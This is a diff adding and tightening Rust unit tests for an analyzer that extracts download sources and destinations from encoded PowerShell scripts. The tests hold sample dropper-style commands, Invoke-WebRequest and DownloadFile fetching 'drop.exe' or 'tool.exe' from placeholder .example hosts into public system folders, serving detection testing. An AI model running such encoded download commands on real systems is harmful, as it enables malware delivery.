@@ -7313,6 +7313,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_attached_outfile_preserves_destination() {
+        let ps = r#"Invoke-WebRequest -Uri "https://outfile-attached.example/drop.exe" -OutFile:"C:\Users\Public\attached.exe""#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://outfile-attached.example/drop.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\attached.exe")
+            )
+        });
+        assert!(
+            has,
+            "attached -OutFile destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_liberal_slash_mixed_case_url_is_structured_download() {
         let ps = r#"Invoke-WebRequest -Uri "hTtP:\\liberal.example\drop.exe" -OutFile "drop.exe""#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -7671,12 +7690,14 @@ $clnt.DownloadFile($url,$file)
         let report = analyze(script.as_bytes(), &Config::default());
         let has = report.traits.iter().any(|t| {
             matches!(t,
-                Trait::Download { src, .. } if src == "http://download.example/tool.exe"
+                Trait::Download { src, dst, .. }
+                    if src == "http://download.example/tool.exe"
+                        && dst.as_deref() == Some("C:\\ProgramData\\tool.exe")
             )
         });
         assert!(
             has,
-            "no Download from raw PowerShell DownloadFile variable URL: {:?}",
+            "no Download from raw PowerShell DownloadFile variable URL and destination: {:?}",
             report.traits
         );
     }
